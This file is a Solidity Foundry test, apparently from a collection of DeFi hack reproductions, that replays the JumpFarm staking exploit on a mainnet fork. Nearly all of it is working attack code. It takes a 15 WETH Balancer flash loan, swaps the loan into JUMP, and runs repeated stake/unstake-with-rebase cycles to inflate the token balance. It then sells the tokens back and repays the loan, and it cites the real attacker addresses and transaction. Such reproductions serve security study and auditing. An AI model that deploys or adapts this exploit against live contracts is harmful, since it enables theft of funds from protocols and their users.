// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~$2.4ETH
// Attacker : https://etherscan.io/address/0x6CE9fa08F139F5e48bc607845E57efE9AA34C9F6
// Attack Contract : https://etherscan.io/address/0x154863eb71De4a34F88Ea57450840eAB1c71abA6
// Attacker Transaction : https://explorer.phalcon.xyz/tx/eth/0x6189ad07894507d15c5dff83f547294e72f18561dc5662a8113f7eb932a5b079

// @Analysis
// https://twitter.com/DecurityHQ/status/1699384904218202618

interface IStaking {
    function unstake(address _to, uint256 _amount, bool _rebase) external;
    function stake(address _to, uint256 _amount) external;
}

contract JumpFarmExploit is Test {
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IERC20 jump = IERC20(0x39d8BCb39DE75218E3C08200D95fde3a479D7a14);
    IStaking staking = IStaking(0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9);
    IERC20 sJump = IERC20(0xdd28c9d511a77835505d2fBE0c9779ED39733bdE);

    function setUp() public {
        vm.createSelectFork("https://eth.llamarpc.com", 18_070_346);

        vm.label(address(balancer), "BalancerVault");
        vm.label(address(weth), "WETH");
        vm.label(address(router), "UniswapV2 Rounter");
        vm.label(address(jump), "jump");
        vm.label(address(staking), "staking");
    }

    function testExploit() public {
        address[] memory token = new address[](1);
        token[0] = address(weth);
        uint256[] memory amount = new uint256[](1);
        amount[0] = 15 * 1 ether;
        balancer.flashLoan(address(this), token, amount, hex"28");

        // weth.withdraw(weth.balanceOf(address(this)));
        emit log_named_decimal_uint("eth balance after exploit", weth.balanceOf(address(this)), 18);
    }

    function receiveFlashLoan(
        address[] memory, /*tokens*/
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        weth.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(jump);
        router.swapExactTokensForTokens(amounts[0], 0, path, address(this), block.timestamp);
        jump.approve(address(staking), type(uint256).max);
        sJump.approve(address(staking), type(uint256).max);
        uint8 i = 0;
        while (i < uint8(userData[0])) {
            i += 1;
            uint256 amountJump = jump.balanceOf(address(this));
            staking.stake(address(this), amountJump);
            uint256 amountSJump = sJump.balanceOf(address(this));
            staking.unstake(address(this), amountSJump, true);
        }

        jump.approve(address(router), type(uint256).max);
        uint256 amount = jump.balanceOf(address(this));
        emit log_named_decimal_uint("jump token balance after exploit", amount, jump.decimals());

        path[0] = address(jump);
        path[1] = address(weth);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
        weth.transfer(address(balancer), amounts[0] + feeAmounts[0]);
    }

    receive() external payable {}
}
